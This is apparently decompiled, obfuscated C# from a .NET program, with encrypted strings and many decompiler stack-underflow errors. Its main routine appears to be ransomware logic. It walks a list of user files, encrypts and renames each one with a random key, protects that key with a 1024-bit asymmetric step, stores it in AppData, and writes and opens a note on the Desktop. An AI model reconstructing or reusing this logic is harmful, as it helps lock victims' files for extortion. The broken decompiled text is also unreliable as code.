using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.IO.IsolatedStorage;
using System.Management;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Permissions;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Xml;
using _0001;
using _0002;
using _0003;
using _0004;
using _0005;
using _0006;
using _0007;
using _0008;
using _000E;
using _000F;
using _0010;
using Microsoft.Win32;
using SmartAssembly.Shared.ReportHelper;
using SmartAssembly.SmartExceptionsCore;
using SmartAssembly.SmartUsageCore;
using _009D_0003_009E_0006;

namespace _0006
{
	internal sealed class _0001
	{
		private readonly Random m__0001 = new Random();

		internal readonly bool _0001;

		[CompilerGenerated]
		private string m__0001;

		[SpecialName]
		[CompilerGenerated]
		public string _0001()
		{
			//IL_000c: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 1
			try
			{
				string text = ((_0001)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			catch (Exception ex)
			{
				global::_0005._0011._0001(ex, (object)this);
				throw;
			}
			return (string)/*Error near IL_001c: Stack underflow*/;
		}

		[SpecialName]
		[CompilerGenerated]
		private void _0001(string P_0)
		{
			//IL_000c: Incompatible stack heights: 0 vs 1
			//IL_000f: Incompatible stack heights: 0 vs 1
			try
			{
				((_0001)/*Error near IL_0009: Stack underflow*/).m__0001 = (string)/*Error near IL_0009: Stack underflow*/;
			}
			catch (Exception ex)
			{
				global::_0005._0011._0001(ex, (object)this, (object)P_0);
				throw;
			}
		}

		public _0001()
		{
			try
			{
				_0001(_0001(20));
			}
			catch (Exception ex)
			{
				global::_0005._0011._0001(ex, (object)this);
				throw;
			}
		}

		private string _0001(int P_0)
		{
			//IL_0087: Incompatible stack heights: 0 vs 1
			//IL_0097: Incompatible stack heights: 0 vs 1
			//IL_00a9: Incompatible stack heights: 0 vs 2
			//IL_00af: Incompatible stack heights: 0 vs 2
			//IL_00b5: Incompatible stack heights: 0 vs 2
			//IL_00bb: Incompatible stack heights: 0 vs 3
			string text = default(string);
			string text2 = default(string);
			int num2 = default(int);
			char c = default(char);
			try
			{
				while (true)
				{
					int num = 107396749;
					if (num != 0)
					{
						_000E._0003._0001(num);
						text = (string)/*Error near IL_008d: Stack underflow*/;
						num = 107396732;
					}
					_000E._0003._0001(num);
					text2 = (string)/*Error near IL_009d: Stack underflow*/;
					while (true)
					{
						if (uint.MaxValue != 0)
						{
							num2 = 0;
						}
						while (true)
						{
							if (0 == 0)
							{
								if (num2 >= P_0)
								{
									break;
								}
								if (false)
								{
									goto end_IL_001e;
								}
								_ = global::_0004._0019;
								_ = global::_0003._007E_0018;
								_ = global::_0002._007E_0016;
								_ = ((_0001)/*Error near IL_004b: Stack underflow*/).m__0001;
								_ = global::_0001._007E_0001;
								int num3 = /*Error near IL_0057: Stack underflow*/((object)/*Error near IL_0057: Stack underflow*/);
								int num4 = /*Error near IL_005c: Stack underflow*/((object)/*Error near IL_005c: Stack underflow*/, num3);
								c = /*Error near IL_0061: Stack underflow*/((object)/*Error near IL_0061: Stack underflow*/, num4);
								string text3 = c.ToString();
								text2 = /*Error near IL_006e: Stack underflow*/((string)/*Error near IL_006e: Stack underflow*/, text3);
								num2++;
							}
						}
						string result = text2;
						if (2u != 0)
						{
							return result;
						}
						continue;
						end_IL_001e:
						break;
					}
				}
			}
			catch (Exception ex)
			{
				global::_0005._0011._0001(ex, (object)text, (object)text2, (object)num2, (object)c, (object)this, (object)P_0);
				throw;
			}
		}
	}
}
namespace _0007
{
	internal sealed class _0001
	{
		internal static void _0001()
		{
			//IL_030e: Incompatible stack heights: 0 vs 2
			//IL_0318: Incompatible stack heights: 0 vs 1
			//IL_0322: Incompatible stack heights: 0 vs 1
			//IL_0332: Incompatible stack heights: 0 vs 2
			//IL_033c: Incompatible stack heights: 0 vs 1
			//IL_0346: Incompatible stack heights: 0 vs 2
			//IL_0350: Incompatible stack heights: 0 vs 1
			//IL_035a: Incompatible stack heights: 0 vs 1
			string text = default(string);
			string text2 = default(string);
			string text3 = default(string);
			string empty = default(string);
			string empty2 = default(string);
			_0006._0001 obj = default(_0006._0001);
			List<string>.Enumerator enumerator = default(List<string>.Enumerator);
			FileInfo fileInfo = default(FileInfo);
			byte[] array = default(byte[]);
			StreamWriter streamWriter = default(StreamWriter);
			string text5 = default(string);
			try
			{
				try
				{
					_ = global::_0004._001A;
					global::_0005._001B(Environment.SpecialFolder.ApplicationData);
					_000E._0003._0001(107396731);
					/*Error near IL_0322: Stack underflow*/((string)/*Error near IL_0322: Stack underflow*/, (string)/*Error near IL_0322: Stack underflow*/);
					text = (string)/*Error near IL_0328: Stack underflow*/;
					_ = global::_0006._001C;
					_000E._0003._0001(107396686);
					/*Error near IL_033c: Stack underflow*/((string)/*Error near IL_033c: Stack underflow*/);
					_ = global::_0004._001A;
					global::_0005._001B(Environment.SpecialFolder.ApplicationData);
					_000E._0003._0001(107396701);
					/*Error near IL_035a: Stack underflow*/((string)/*Error near IL_035a: Stack underflow*/, (string)/*Error near IL_035a: Stack underflow*/);
					text2 = (string)/*Error near IL_005a: Stack underflow*/;
					text3 = global::_0004._001A(global::_0005._001B(Environment.SpecialFolder.Desktop), _000E._0003._0001(107396652));
					empty = string.Empty;
					empty2 = string.Empty;
					string text4 = _000E._0003._0001(107396623);
					List<string> list = global::_0005._0011._0001((string)/*Error near IL_0096: Stack underflow*/, text4);
					obj = new _0006._0001();
					enumerator = list.GetEnumerator();
					try
					{
						while (enumerator.MoveNext())
						{
							fileInfo = new FileInfo(enumerator.Current);
							if (global::_0008._0095(global::_0007._007E_007F(fileInfo), _000E._0003._0001(107396618)) || global::_0008._0095(global::_0007._007E_007F(fileInfo), _000E._0003._0001(107396609)))
							{
								try
								{
									global::_0005._0011._0001(obj, global::_0007._007E_0080(fileInfo));
									global::_000E._0097(global::_0007._007E_0080(fileInfo), global::_0004._001A(global::_0007._007E_0081(fileInfo), global::_0004._0019(global::_0007._007E_0082(fileInfo), _000E._0003._0001(107396636))));
								}
								catch (Exception)
								{
								}
							}
							else
							{
								try
								{
									global::_0005._0011._0001(global::_0007._007E_0080(fileInfo), obj);
									global::_000E._0097(global::_0007._007E_0080(fileInfo), global::_0004._001A(global::_0007._007E_0081(fileInfo), global::_0004._0019(global::_0007._007E_0082(fileInfo), _000E._0003._0001(107397099))));
								}
								catch (Exception)
								{
								}
							}
						}
					}
					finally
					{
						do
						{
							((IDisposable)enumerator).Dispose();
						}
						while (1 == 0);
					}
					global::_0005._0011._0001(obj, 1024, out empty, ref empty2);
					array = global::_0005._0011._0001(obj._0001());
					array = global::_0005._0011._0001(empty, obj, array, 1024);
					global::_000E._0098(text2, global::_0010._001B_0002(array));
					streamWriter = new StreamWriter(text, append: true);
					try
					{
						_0011._007E_001D_0002(streamWriter, _000E._0003._0001(107397110));
					}
					finally
					{
						if (streamWriter != null)
						{
							global::_000F._007E_0099(streamWriter);
						}
					}
					text5 = global::_0005._0011._0001();
					text5 = _0012._007E_008C_0002(text5, _000E._0003._0001(107397017), global::_0005._0011._0001());
					text5 = _0012._007E_008C_0002(text5, _000E._0003._0001(107396960), _000E._0003._0001(107396935));
					_0014._0091_0002(global::_0004._001A(global::_0005._001B(Environment.SpecialFolder.Desktop), _000E._0003._0001(107396922)), text5, _0013._008D_0002());
					global::_0005._0011._0001(empty2);
					if (!_0015._0092_0002(text3))
					{
						_0016._0095_0002(text3, global::_0005._0011._0001());
					}
					_0017._0096_0002(text3);
				}
				catch (Exception)
				{
				}
			}
			catch (Exception ex4)
			{
				global::_0005._0011._0001(ex4, new object[11]
				{
					text, text2, text3, empty, empty2, obj, array, text5, enumerator, fileInfo,
					streamWriter
				});
				throw;
			}
		}
	}
}
namespace _0004
{
	internal sealed class _0001
	{
		internal string _0001;

		internal string _0002;

		public _0001()
		{
			try
			{
				global::_0005._0011._0001(this);
			}
			catch (Exception ex)
			{
				global::_0005._0011._0001(ex, (object)this);
				throw;
			}
		}
	}
}
namespace _0005
{
	internal static class _0001
	{
	}
}
namespace _0001
{
	internal sealed class _0002
	{
	}
}
namespace _0005
{
	internal sealed class _0002
	{
	}
}
namespace _0010
{
	[GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "16.0.0.0")]
	[CompilerGenerated]
	internal sealed class _0001
	{
		internal static ResourceManager _0001;

		internal static CultureInfo _0001;

		internal _0001()
		{
		}
	}
}
namespace _0003
{
	[CompilerGenerated]
	internal sealed class _0002
	{
		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 19)]
		internal struct _0001
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 26)]
		internal struct _0002
		{
		}

		internal static readonly _0002 _0001/* Not supported: data(55 89 E5 57 8B 7D 10 6A 01 58 53 0F A2 89 07 89 57 04 5B 5F 89 EC 5D C2 10 00) */;

		internal static readonly _0001 _0001/* Not supported: data(53 48 C7 C0 01 00 00 00 0F A2 41 89 00 41 89 50 04 5B C3) */;
	}
}
namespace _0010
{
	[AttributeUsage(AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Constructor | AttributeTargets.Method)]
	internal sealed class _0002 : Attribute
	{
	}
}
namespace _0004
{
	internal sealed class _0002
	{
	}
}
namespace _0008
{
	internal sealed class _0001
	{
		internal struct _0001
		{
			public string _0001;

			public Version _0001;

			public string _0002;

			public string _0003;

			public string _0001(bool _0002)
			{
				//IL_00bd: Incompatible stack heights: 0 vs 1
				//IL_00c9: Incompatible stack heights: 0 vs 1
				//IL_00cf: Incompatible stack heights: 0 vs 1
				//IL_00d9: Incompatible stack heights: 0 vs 1
				//IL_00df: Incompatible stack heights: 0 vs 1
				//IL_00e5: Incompatible stack heights: 0 vs 1
				//IL_00ef: Incompatible stack heights: 0 vs 1
				//IL_00f5: Incompatible stack heights: 0 vs 1
				StringBuilder stringBuilder = default(StringBuilder);
				try
				{
					new StringBuilder();
					stringBuilder = (StringBuilder)/*Error near IL_00c3: Stack underflow*/;
					string value = ((_0001)/*Error near IL_0019: Stack underflow*/)._0001;
					((StringBuilder)/*Error near IL_00d9: Stack underflow*/).Append(value);
					if ((int)/*Error near IL_0026: Stack underflow*/ != 0)
					{
						_ = ((_0001)/*Error near IL_0030: Stack underflow*/)._0001 != null;
						if ((int)/*Error near IL_0038: Stack underflow*/ != 0)
						{
							((StringBuilder)/*Error near IL_0047: Stack underflow*/).Append(", Version=");
							stringBuilder.Append(this._0001);
						}
					}
					stringBuilder.Append(", Culture=");
					stringBuilder.Append((this._0002.Length == 0) ? "neutral" : this._0002);
					stringBuilder.Append(", PublicKeyToken=");
					stringBuilder.Append((_0003.Length == 0) ? "null" : _0003);
					return stringBuilder.ToString();
				}
				catch (Exception ex)
				{
					global::_0005._0011._0001(ex, (object)stringBuilder, (object)this, (object)_0002);
					throw;
				}
			}

			public _0001(string _0003)
			{
				string[] array = default(string[]);
				int i = default(int);
				string text = default(string);
				try
				{
					this._0001 = null;
					_0002 = string.Empty;
					this._0003 = string.Empty;
					this._0001 = string.Empty;
					array = _0003.Split(new char[1] { ',' });
					for (i = 0; i < array.Length; i++)
					{
						text = array[i].Trim();
						if (text.StartsWith("Version="))
						{
							this._0001 = new Version(text.Substring(8));
						}
						else if (text.StartsWith("Culture="))
						{
							_0002 = text.Substring(8);
							if (_0002 == "neutral")
							{
								_0002 = string.Empty;
							}
						}
						else if (text.StartsWith("PublicKeyToken="))
						{
							this._0003 = text.Substring(15);
							if (this._0003 == "null")
							{
								this._0003 = string.Empty;
							}
						}
						else
						{
							this._0001 = text;
						}
					}
				}
				catch (Exception ex)
				{
					global::_0005._0011._0001(ex, (object)array, (object)i, (object)text, (object)this, (object)_0003);
					throw;
				}
			}
		}

		internal const string _0001 = "{71461f04-2faa-4bb9-a0dd-28a79101b599}";

		private const int m__0001 = 4;

		internal static Dictionary<string, Assembly> _0001;

		internal unsafe static bool IsWebApplication
		{
			get
			{
				//IL_0040: Incompatible stack heights: 0 vs 1
				//IL_0047: Incompatible stack heights: 0 vs 1
				//IL_004e: Incompatible stack heights: 0 vs 1
				//IL_0055: Incompatible stack heights: 0 vs 1
				//IL_005b: Incompatible stack heights: 0 vs 1
				//IL_0062: Incompatible stack heights: 0 vs 1
				//IL_0065: Incompatible stack heights: 0 vs 1
				void* ptr = stackalloc byte[2];
				string text = default(string);
				try
				{
					try
					{
						Process.GetCurrentProcess();
						_ = ((Process)/*Error near IL_0047: Stack underflow*/).MainModule;
						_ = ((ProcessModule)/*Error near IL_004e: Stack underflow*/).ModuleName;
						((string)/*Error near IL_0055: Stack underflow*/).ToLower();
						text = (string)/*Error near IL_0058: Stack underflow*/;
						_ = (string?)/*Error near IL_0062: Stack underflow*/ == "w3wp.exe";
						if ((int)/*Error near IL_001e: Stack underflow*/ != 0)
						{
							*(sbyte*)(nint)/*Error near IL_0022: Stack underflow*/ = 1;
						}
						else
						{
							if (!(text == "aspnet_wp.exe"))
							{
								goto IL_006a;
							}
							if (uint.MaxValue != 0)
							{
								*(sbyte*)ptr = 1;
							}
						}
					}
					catch
					{
						goto IL_006a;
					}
					if (0 == 0)
					{
						((byte*)ptr)[1] = *(byte*)ptr;
					}
					goto end_IL_0009;
					IL_006a:
					((byte*)ptr)[1] = 0;
					end_IL_0009:;
				}
				catch (Exception ex)
				{
					global::_0005._0011._0001(ex, (object)text, (object)(*(bool*)ptr));
					throw;
				}
				return ((byte*)ptr)[1] != 0;
			}
		}

		static _0001()
		{
			//IL_000e: Incompatible stack heights: 0 vs 1
			try
			{
				new Dictionary<string, Assembly>();
				_0008._0001._0001 = (Dictionary<string, Assembly>)/*Error near IL_0007: Stack underflow*/;
			}
			catch (Exception ex)
			{
				global::_0005._0011._0001(ex);
				throw;
			}
		}
	}
}
namespace _000E
{
	internal sealed class _0001
	{
	}
}
namespace _0001
{
	[AttributeUsage(AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Constructor | AttributeTargets.Method)]
	internal sealed class _0001 : Attribute
	{
	}
}
namespace _0002
{
	[AttributeUsage(AttributeTargets.Assembly | AttributeTargets.Module | AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Enum | AttributeTargets.Constructor | AttributeTargets.Method | AttributeTargets.Property | AttributeTargets.Field | AttributeTargets.Event | AttributeTargets.Interface | AttributeTargets.Parameter | AttributeTargets.Delegate)]
	internal sealed class _0001 : Attribute
	{
	}
}
namespace _0005
{
	[AttributeUsage(AttributeTargets.Assembly | AttributeTargets.Module | AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Enum | AttributeTargets.Constructor | AttributeTargets.Method | AttributeTargets.Property | AttributeTargets.Field | AttributeTargets.Event | AttributeTargets.Interface | AttributeTargets.Parameter | AttributeTargets.Delegate)]
	internal sealed class _0003 : Attribute
	{
	}
}
namespace _000F
{
	[AttributeUsage(AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Enum | AttributeTargets.Interface)]
	internal sealed class _0001 : Attribute
	{
	}
}
namespace _0005
{
	[AttributeUsage(AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Enum | AttributeTargets.Interface)]
	internal sealed class _0004 : Attribute
	{
	}
}
namespace _0003
{
	[AttributeUsage(AttributeTargets.Class | AttributeTargets.Method)]
	internal sealed class _0003 : Attribute
	{
	}
	internal sealed class _0001
	{
		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 116)]
		private struct _0001
		{
		}

		internal static readonly _0001 _0001/* Not supported: data(01 00 02 00 03 00 04 00 05 00 06 00 07 00 08 00 0E 00 0F 00 10 00 11 00 12 00 13 00 14 00 15 00 16 00 17 00 18 00 19 00 1A 00 1B 00 1C 00 1D 00 1E 00 1F 00 7F 00 80 00 81 00 82 00 83 00 84 00 86 00 87 00 88 00 89 00 8A 00 8B 00 8C 00 8D 00 8E 00 8F 00 90 00 91 00 92 00 93 00 94 00 95 00 96 00 97 00 98 00 99 00 9A 00 9B 00 9C 00 9D 00 9E 00 9F 00) */;
	}
}
namespace _0005
{
	internal sealed class _0005
	{
	}
}
namespace _0001
{
	internal sealed class _0003
	{
		private static Assembly m__0001;

		private static string[] m__0001;

		internal static void _0001()
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			try
			{
				try
				{
					_ = AppDomain.CurrentDomain;
					ResolveEventHandler value = _0001;
					((AppDomain)/*Error near IL_001e: Stack underflow*/).ResourceResolve += value;
				}
				catch
				{
				}
			}
			catch (Exception ex)
			{
				global::_0005._0011._0001(ex);
				throw;
			}
		}

		private static Assembly _0001(object P_0, ResolveEventArgs P_1)
		{
			//IL_0043: Incompatible stack heights: 0 vs 1
			//IL_004a: Incompatible stack heights: 0 vs 1
			//IL_0070: Incompatible stack heights: 0 vs 1
			//IL_008d: Incompatible stack heights: 0 vs 1
			//IL_009d: Incompatible stack heights: 0 vs 2
			//IL_00a4: Incompatible stack heights: 0 vs 1
			//IL_00ab: Incompatible stack heights: 0 vs 1
			string[] array2 = default(string[]);
			try
			{
				if ((object)_0003.m__0001 != null)
				{
					goto IL_0053;
				}
				string[] array = _0003.m__0001;
				if (0 == 0)
				{
					array2 = array;
				}
				goto IL_0092;
				IL_0053:
				_ = _0003.m__0001;
				_ = ((ResolveEventArgs)/*Error near IL_00a4: Stack underflow*/).Name;
				_0001((IEnumerable<string>)/*Error near IL_00ab: Stack underflow*/, (string)/*Error near IL_00ab: Stack underflow*/);
				do
				{
					if ((int)/*Error near IL_0060: Stack underflow*/ == 0)
					{
						return null;
					}
					_0001(Assembly.GetExecutingAssembly());
				}
				while (false);
				if ((int)/*Error near IL_0074: Stack underflow*/ == 0)
				{
					Assembly result = null;
					if (false)
					{
						goto IL_0092;
					}
					return result;
				}
				return _0003.m__0001;
				IL_0092:
				Monitor.Enter((object)/*Error near IL_0097: Stack underflow*/);
				try
				{
					Assembly.Load("{705a9718-334a-4210-9804-8f16f8d387a5}, PublicKeyToken=3e56350693f7355e");
					_0003.m__0001 = (Assembly)/*Error near IL_0026: Stack underflow*/;
					if ((object)_0003.m__0001 != null)
					{
						_0003.m__0001.GetManifestResourceNames();
						_0003.m__0001 = (string[])/*Error near IL_003c: Stack underflow*/;
					}
				}
				finally
				{
					Monitor.Exit(array2);
				}
				goto IL_0053;
			}
			catch (Exception ex)
			{
				global::_0005._0011._0001(ex, (object)array2, P_0, (object)P_1);
				throw;
			}
		}

		private unsafe static bool _0001(IEnumerable<string> P_0, string P_1)
		{
			//IL_0034: Incompatible stack heights: 0 vs 1
			//IL_003b: Incompatible stack heights: 0 vs 1
			//IL_003e: Incompatible stack heights: 0 vs 1
			//IL_0045: Incompatible stack heights: 0 vs 1
			//IL_0048: Incompatible stack heights: 0 vs 1
			//IL_0064: Incompatible stack heights: 0 vs 1
			//IL_006e: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[2];
			IEnumerator<string> enumerator = default(IEnumerator<string>);
			try
			{
				((IEnumerable<string>)/*Error near IL_006e: Stack underflow*/).GetEnumerator();
				if (4u != 0)
				{
					enumerator = (IEnumerator<string>)/*Error near IL_0074: Stack underflow*/;
				}
				try
				{
					while (enumerator.MoveNext())
					{
						_ = ((IEnumerator<string>)/*Error near IL_003b: Stack underflow*/).Current;
						_ = (string?)/*Error near IL_0045: Stack underflow*/ == (string?)/*Error near IL_0045: Stack underflow*/;
						if ((int)/*Error near IL_0023: Stack underflow*/ == 0)
						{
							continue;
						}
						*(sbyte*)(nint)/*Error near IL_0027: Stack underflow*/ = 1;
						goto IL_005b;
					}
				}
				finally
				{
					enumerator?.Dispose();
				}
				((byte*)ptr)[1] = 0;
				goto end_IL_0009;
				IL_005b:
				((byte*)ptr)[1] = *(byte*)ptr;
				end_IL_0009:;
			}
			catch (Exception ex)
			{
				global::_0005._0011._0001(ex, (object)enumerator, (object)(*(bool*)ptr), (object)P_0, (object)P_1);
				throw;
			}
			return ((byte*)ptr)[1] != 0;
		}

		private unsafe static bool _0001(Assembly P_0)
		{
			//IL_004f: Incompatible stack heights: 0 vs 1
			//IL_0056: Incompatible stack heights: 0 vs 1
			//IL_005c: Incompatible stack heights: 0 vs 1
			//IL_005f: Incompatible stack heights: 0 vs 1
			//IL_0062: Incompatible stack heights: 0 vs 1
			//IL_0069: Incompatible stack heights: 0 vs 1
			//IL_0070: Incompatible stack heights: 0 vs 1
			byte* num = stackalloc byte[6];
			void* ptr = default(void*);
			if (0 == 0)
			{
				ptr = num;
			}
			StackFrame[] array = default(StackFrame[]);
			try
			{
				try
				{
					new StackTrace();
					((StackTrace)/*Error near IL_0056: Stack underflow*/).GetFrames();
					array = (StackFrame[])/*Error near IL_0059: Stack underflow*/;
					*(int*)(nint)/*Error near IL_0015: Stack underflow*/ = 2;
					while (true)
					{
						if (*(int*)ptr < array.Length)
						{
							int num2 = *(int*)(nint)/*Error near IL_001c: Stack underflow*/;
							((StackFrame)((object[])/*Error near IL_001d: Stack underflow*/)[num2]).GetMethod();
							_ = ((MemberInfo)/*Error near IL_0070: Stack underflow*/).Module;
							if ((object)((Module)/*Error near IL_0026: Stack underflow*/).Assembly != P_0)
							{
								goto IL_0030;
							}
						}
						else
						{
							if (false)
							{
								goto IL_0030;
							}
							((byte*)ptr)[4] = 0;
							if (true)
							{
								break;
							}
						}
						((byte*)ptr)[4] = 1;
						break;
						IL_0030:
						(*(int*)ptr)++;
					}
				}
				catch
				{
					if (7u != 0)
					{
						((byte*)ptr)[4] = 1;
					}
				}
				((byte*)ptr)[5] = ((byte*)ptr)[4];
			}
			catch (Exception ex)
			{
				global::_0005._0011._0001(ex, (object)array, (object)(*(int*)ptr), (object)(((byte*)ptr)[4] != 0), (object)P_0);
				throw;
			}
			return ((byte*)ptr)[5] != 0;
		}

		static _0003()
		{
			try
			{
				_0003.m__0001 = new string[0];
			}
			catch (Exception ex)
			{
				global::_0005._0011._0001(ex);
				throw;
			}
		}
	}
}
namespace _000E
{
	internal sealed class _0002
	{
		internal static Version _0001;

		private static string m__0002;

		[SpecialName]
		public static string _0001()
		{
			//IL_0023: Incompatible stack heights: 0 vs 2
			//IL_002a: Incompatible stack heights: 0 vs 1
			//IL_0031: Incompatible stack heights: 0 vs 1
			//IL_003b: Incompatible stack heights: 0 vs 1
			//IL_0042: Incompatible stack heights: 0 vs 1
			_ = _0019._0098_0002;
			_0003._0001(107396893);
			_0003._0001(107396328);
			global::_0005._0011._0001();
			((int)/*Error near IL_0017: Stack underflow*/).ToString();
			/*Error near IL_0042: Stack underflow*/((string)/*Error near IL_0042: Stack underflow*/, (string)/*Error near IL_0042: Stack underflow*/, (string)/*Error near IL_0042: Stack underflow*/);
			return (string)/*Error near IL_001e: Stack underflow*/;
		}

		static _0002()
		{
			//IL_001a: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			_0003._0001(107396323);
			new Version((string)/*Error near IL_0021: Stack underflow*/);
			_000E._0002._0001 = (Version)/*Error near IL_000e: Stack underflow*/;
			m__0002 = null;
		}
	}
}
namespace _0003
{
	internal sealed class _0004
	{
	}
}
namespace _0001
{
	internal sealed class _0004
	{
	}
}
namespace _0002
{
	internal enum _0002
	{
		_0001,
		_0002,
		_0003,
		_0004
	}
}
namespace _0010
{
	internal static class _0003
	{
		public static readonly UIntPtr _0001;

		public static readonly UIntPtr _0002;

		public static readonly UIntPtr _0003;

		public static readonly UIntPtr _0004;

		public static readonly UIntPtr _0005;

		public static readonly UIntPtr _0006;

		public static readonly UIntPtr _0007;

		static _0003()
		{
			//IL_0069: Incompatible stack heights: 0 vs 1
			//IL_0073: Incompatible stack heights: 0 vs 1
			//IL_007a: Incompatible stack heights: 0 vs 1
			//IL_0081: Incompatible stack heights: 0 vs 1
			//IL_0088: Incompatible stack heights: 0 vs 1
			//IL_008f: Incompatible stack heights: 0 vs 1
			//IL_0096: Incompatible stack heights: 0 vs 1
			new UIntPtr(2147483648u);
			_0001 = (UIntPtr)/*Error near IL_000c: Stack underflow*/;
			int num;
			if (0 == 0)
			{
				num = -2147483647;
				if (num == 0)
				{
					goto IL_0075;
				}
				new UIntPtr((uint)num);
				_0002 = (UIntPtr)/*Error near IL_001e: Stack underflow*/;
			}
			goto IL_001e;
			IL_001e:
			num = -2147483646;
			goto IL_0075;
			IL_0075:
			while (true)
			{
				new UIntPtr((uint)num);
				_0003 = (UIntPtr)/*Error near IL_002a: Stack underflow*/;
				new UIntPtr(2147483651u);
				_0004 = (UIntPtr)/*Error near IL_0036: Stack underflow*/;
				new UIntPtr(2147483652u);
				_0005 = (UIntPtr)/*Error near IL_0042: Stack underflow*/;
				if (false)
				{
					break;
				}
				num = -2147483643;
				if (num == 0)
				{
					continue;
				}
				if (num != 0)
				{
					new UIntPtr((uint)num);
					_0006 = (UIntPtr)/*Error near IL_0057: Stack underflow*/;
					num = -2147483642;
				}
				new UIntPtr((uint)num);
				_0007 = (UIntPtr)/*Error near IL_0063: Stack underflow*/;
				return;
			}
			goto IL_001e;
		}
	}
}
namespace _0002
{
	internal abstract class _0003 : IDisposable
	{
		[CompilerGenerated]
		private UIntPtr m__0001;

		public _0003(UIntPtr P_0)
		{
			_0001(P_0);
		}

		[SpecialName]
		[CompilerGenerated]
		public UIntPtr _0001()
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			return ((_0003)/*Error near IL_0007: Stack underflow*/).m__0001;
		}

		[SpecialName]
		[CompilerGenerated]
		public void _0001(UIntPtr P_0)
		{
			//IL_000b: Incompatible stack heights: 0 vs 1
			//IL_000e: Incompatible stack heights: 0 vs 1
			((_0003)/*Error near IL_0009: Stack underflow*/).m__0001 = (UIntPtr)/*Error near IL_0009: Stack underflow*/;
		}

		public abstract object _0001(string P_0);

		public abstract bool _0001(string _0002, out object _0003);

		public abstract void _0001();

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001();
		}
	}
}
namespace _0004
{
	internal static class _0003
	{
	}
}
namespace _0003
{
	internal sealed class _0005 : global::_0002._0003
	{
		public _0005(UIntPtr P_0)
			: base(P_0)
		{
		}

		public override void _0001()
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			//IL_0010: Incompatible stack heights: 0 vs 1
			//IL_0017: Incompatible stack heights: 0 vs 1
			((global::_0002._0003)/*Error near IL_0010: Stack underflow*/)._0001();
			_009C_0003_009E_0006._007F_0004_0006((UIntPtr)/*Error near IL_0017: Stack underflow*/);
		}

		public override object _0001(string P_0)
		{
			//IL_000a: Incompatible stack heights: 0 vs 1
			//IL_0011: Incompatible stack heights: 0 vs 1
			//IL_0014: Incompatible stack heights: 0 vs 1
			//IL_001b: Incompatible stack heights: 0 vs 1
			((global::_0002._0003)/*Error near IL_0011: Stack underflow*/)._0001();
			_009C_0003_009E_0006._0089_0098((UIntPtr)/*Error near IL_001b: Stack underflow*/, (string)/*Error near IL_001b: Stack underflow*/);
			return (object)/*Error near IL_0009: Stack underflow*/;
		}

		public unsafe override bool _0001(string _0002, out object _0003)
		{
			//IL_0016: Incompatible stack heights: 0 vs 1
			//IL_0019: Incompatible stack heights: 0 vs 1
			//IL_0020: Incompatible stack heights: 0 vs 1
			//IL_0023: Incompatible stack heights: 0 vs 1
			//IL_002a: Incompatible stack heights: 0 vs 1
			//IL_002d: Incompatible stack heights: 0 vs 1
			if (true)
			{
				((global::_0002._0003)/*Error near IL_0020: Stack underflow*/)._0001();
				_009C_0003_009E_0006._0089_0098((UIntPtr)/*Error near IL_002a: Stack underflow*/, (string)/*Error near IL_002a: Stack underflow*/);
				*(_003F*)(nint)/*Error near IL_000e: Stack underflow*/ = /*Error near IL_000e: Stack underflow*/;
			}
			return *(object*)(nint)/*Error near IL_0011: Stack underflow*/ != null;
		}
	}
}
namespace _0001
{
	internal enum _0005
	{
		_0001 = 131097,
		_0002 = 131078,
		_0003 = 131103
	}
}
namespace _0008
{
	internal enum _0002
	{
		_0001 = -2,
		_0002,
		_0003,
		_0004,
		_0005
	}
	internal enum _0003
	{
		_0001 = 0,
		_0002 = 0x100,
		_0003 = 0x200
	}
}
namespace _0006
{
	internal static class _0002
	{
	}
}
namespace _000E
{
	internal sealed class _0003
	{
		private static readonly string m__0001;

		private static readonly string _0002;

		internal static readonly byte[] _0001;

		internal static readonly Dictionary<int, string> _0001;

		internal static readonly object _0001;

		internal static readonly bool _0001;

		private static readonly int m__0001;

		public static string _0001(int P_0)
		{
			//IL_0010: Unknown result type (might be due to invalid IL or missing references)
			//IL_0020: Unknown result type (might be due to invalid IL or missing references)
			//IL_0025: Incompatible stack heights: 0 vs 1
			//IL_003c: Incompatible stack heights: 0 vs 1
			//IL_0040: Expected I4, but got Unknown
			//IL_0043: Incompatible stack heights: 0 vs 1
			//IL_0047: Expected I4, but got Unknown
			//IL_004a: Incompatible stack heights: 0 vs 1
			//IL_0051: Incompatible stack heights: 0 vs 1
			//IL_0057: Incompatible stack heights: 0 vs 1
			//IL_005e: Incompatible stack heights: 0 vs 1
			try
			{
				while (2u != 0)
				{
					int num;
					if (4u != 0)
					{
						num = 107396847;
						while (true)
						{
							if (num != 0)
							{
								P_0 = /*Error near IL_0011: Stack underflow*/^ num;
								if (7 == 0)
								{
									break;
								}
								num = _0003.m__0001;
							}
							if (6 == 0)
							{
								continue;
							}
							goto IL_0020;
						}
						continue;
					}
					goto IL_002a;
					IL_002a:
					if ((int)/*Error near IL_002c: Stack underflow*/ == 0)
					{
						global::_0005._0011._0001((int)/*Error near IL_0051: Stack underflow*/);
						return (string)/*Error near IL_0053: Stack underflow*/;
					}
